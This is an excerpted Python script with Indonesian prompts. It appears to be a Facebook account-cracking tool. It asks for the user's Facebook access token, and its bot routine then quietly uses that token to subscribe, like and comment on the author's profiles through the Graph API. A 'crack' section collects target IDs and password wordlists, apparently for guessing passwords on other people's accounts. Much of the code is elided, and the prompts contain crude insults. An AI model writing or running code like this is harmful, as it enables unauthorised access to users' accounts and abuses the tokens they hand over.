...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   :  Farag Lhsone
 [\x1b[1;96m+%s] Github   :   0944831283
 [\x1b[1;96m+%s] facebook.com/profile.php?id=100063689356604
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def __login__(self):
		os.system('clear')
		banner()
		token = input(' [%s*%s] Masukkan token : '%(O,N))
		if token in ['']:
	...
	def takon(self):
		...
		if takon in ['y','Y','iya']:
			jalan('\n %s[%s!%s] Kamu akan di arahkan ke Fb untuk info lebih lanjut'%(N,O,N))
			os.system('xdg-open https://www.facebook.com/basari.shp');exit()
		else:
			login().__login__()
	def bot(self):
		# HARGAI 
		...
		requests.post('https://graph.facebook.com/100051967952842/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100051967952842/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100051967952842/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100051967952842/comments/?message=' +komen+ '&access_token=' + toket)
		requests.post('https://graph.facebook.com/571109557964638/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/571109557964638/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/571109557964638/likes?summary=true&access_token=' + toket)
...
class menu:
	...
	def pilih(self):
		print(' %s'%(N))
		usna = input(' %s[%s+%s] pilih : '%(N,O,N))
		if usna in ['']:
			print(' %s'%(N))
			print(' %s[%s!%s] pilih yang bener kontol'%(N,M,N));time.sleep(2);menu().main()
		elif usna in ['0','00']:
			try:
			...
			try:
				print(' %s'%(N))
				idt = input(' %s[%s•%s] Masukkan id : '%(N,O,N))
			...
			for ikeh in range(pler):
				...
				try:
					print(' %s'%(N))
					idt = input(' %s[%s•%s] Masukkan id yang ke %s : '%(N,O,N,ikeh))
			...
			print(' %s'%(N))
			print(' %s[%s•%s] Masukkan -> Cp.txt sebagai file'%(N,O,N))
			files = input(' %s[%s•%s] Masukkan files : '%(N,O,N))
			try:
			...
			url_wa = ("https://api.whatsapp.com/+628976622679?phone="+nom_wa+"&text="+kata)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		else:
...
class crack:
	...
	def fbeh(self,id):
		...
		if kham in ['']:
			print(' %s[%s!%s] Jangan kosong !'%(N,M,N));time.sleep(2);crack().fbeh(id)
		elif kham in ['y','Y','Iya','iya']:
			print(' %s'%(N))
			print(' %s[%s!%s] Gunakan koma untuk pemisahan contoh : sayang,katasandi'%(N,O,N))
			while True:
	...
	def otomatis(self):
		...
		if oto in ['']:
			print(' [%s!%s] jangan kosong su'%(O,N));self.otomatis()
		elif oto in ['1','01']:
			self.free()
		elif oto in ['2','02']:
			self.basic()
